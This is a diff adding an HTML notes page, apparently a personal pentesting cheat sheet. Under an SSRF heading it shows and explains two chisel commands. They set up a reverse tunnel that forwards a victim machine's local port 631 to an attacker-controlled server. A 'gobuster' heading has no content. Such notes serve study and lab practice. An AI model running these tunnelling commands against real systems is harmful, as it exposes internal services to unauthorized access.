@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Linux Tools</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="note.css">
+   
+</head>
+<body>
+    <h1>Server-side request forgery (SSRF)</h1>
+    <ul>
+        <li><code>$ chisel_x.xx.x_linux_amd64 server -p 9000 [ attacker machine]</code>  <br><br>
+            > set up a reverse tunneling connection between an attacker's machine (server) and a victim's machine (client) <br><br></li>
+        <li><code>$ chisel_x.xx.x_linux_amd64 client yourIP:9000 R:9631:localhost:631 [ victim mcahine]</code> <br><br>
+        > R:9631:localhost:631: Creates a reverse tunnel <br>
+        > R: Indicates reverse port forwarding. <br>
+        > 9631: The port on the attacker's machine (server) to be forwarded. <br>
+        > localhost:631: The victim’s local port (631) data will be forwarded to attacker & they can access it on their local machine http://IP:9631 
+        </li> 
+    </ul>
+    
+    <h1>gobuster</h1>
+    <button onclick="goBack()">Back</button>
+
+    <script src="note.js"></script>
+</body>
+</html>
